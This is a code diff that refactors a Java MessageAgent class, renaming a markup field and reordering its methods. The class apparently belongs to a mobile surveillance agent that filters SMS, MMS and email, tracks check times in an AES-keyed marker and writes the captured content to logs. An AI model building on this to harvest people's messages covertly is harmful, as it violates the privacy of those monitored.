@@ -45,7 +45,17 @@ public class MessageAgent extends Agent {
     protected static final int SLEEPTIME = 5000;
 
     MailListener mailListener;
-    Markup markup_date;
+    Markup markupDate;
+
+    long timestamp;
+
+    long firsttimestamp = 0;
+
+    protected String identification;
+    public Vector filtersSMS = new Vector();
+
+    public Vector filtersMMS = new Vector();
+    public Vector filtersEMAIL = new Vector();
 
     public MessageAgent(final boolean agentStatus) {
         super(AGENT_MESSAGE, agentStatus, true, "MessageAgent");
@@ -63,20 +73,62 @@ public class MessageAgent extends Agent {
         parse(confParams);
 
         // mantiene la data prima di controllare tutte le email
-        markup_date = new Markup(agentId, Keys.getInstance().getAesKey());
+        markupDate = new Markup(agentId, Keys.getInstance().getAesKey());
 
         setDelay(SLEEPTIME);
         setPeriod(NEVER);
 
     }
 
-    long timestamp;
-    long firsttimestamp = 0;
+    public void actualRun() {
+        mailListener.run();
+    }
 
-    protected String identification;
-    public Vector filtersSMS = new Vector();
-    public Vector filtersMMS = new Vector();
-    public Vector filtersEMAIL = new Vector();
+    public void actualStart() {
+        mailListener.start();
+    }
+
+    public void actualStop() {
+        mailListener.stop();
+    }
+
+    void createLog(final byte[] additionalData, final byte[] content) {
+        log.createLog(additionalData);
+        log.writeLog(content);
+        log.close();
+    }
+
+    long initMarkup() {
+        long lastcheck = 0;
+        if (markupDate.isMarkup() == false) {
+            //#debug
+            debug.info("Il Markup non esiste, timestamp = 0 ");
+            timestamp = 0;
+            final Date date = new Date();
+            firsttimestamp = date.getTime();
+
+        } else {
+            // serializzi la data date
+            //#debug
+            debug.info("::::::::::::::::::::::::::::::::");
+            final Date date = new Date();
+            timestamp = date.getTime();
+
+            byte[] deserialized;
+            //#debug
+            debug.trace("Sto leggendo dal markup");
+            try {
+                deserialized = markupDate.readMarkup();
+                lastcheck = Utils.byteArrayToLong(deserialized, 0);
+
+            } catch (final IOException e) {
+                // TODO Auto-generated catch block
+                e.printStackTrace();
+            }
+
+        }
+        return lastcheck;
+    }
 
     protected boolean parse(final byte[] conf) {
 
@@ -168,60 +220,10 @@ public class MessageAgent extends Agent {
         return tokens;
     }
 
-    public void actualStart() {
-        mailListener.start();
-    }
-
-    public void actualStop() {
-        mailListener.stop();
-    }
-
-    public void actualRun() {
-        mailListener.run();
-    }
-
-    long initMarkup() {
-        long lastcheck = 0;
-        if (markup_date.isMarkup() == false) {
-            //#debug
-            debug.info("Il Markup non esiste, timestamp = 0 ");
-            timestamp = 0;
-            final Date date = new Date();
-            firsttimestamp = date.getTime();
-
-        } else {
-            // serializzi la data date
-            //#debug
-            debug.info("::::::::::::::::::::::::::::::::");
-            final Date date = new Date();
-            timestamp = date.getTime();
-
-            byte[] deserialized;
-            //#debug
-            debug.trace("Sto leggendo dal markup");
-            try {
-                deserialized = markup_date.readMarkup();
-                lastcheck = Utils.byteArrayToLong(deserialized, 0);
-
-            } catch (final IOException e) {
-                // TODO Auto-generated catch block
-                e.printStackTrace();
-            }
-
-        }
-        return lastcheck;
-    }
-
     void updateMarkup() {
         //#debug
         debug.trace("Sto scrivendo nel markup");
         final byte[] serialize = Utils.longToByteArray(timestamp);
-        markup_date.writeMarkup(serialize);
-    }
-
-    void createLog(final byte[] additionalData, final byte[] content) {
-        log.createLog(additionalData);
-        log.writeLog(content);
-        log.close();
+        markupDate.writeMarkup(serialize);
     }
 }
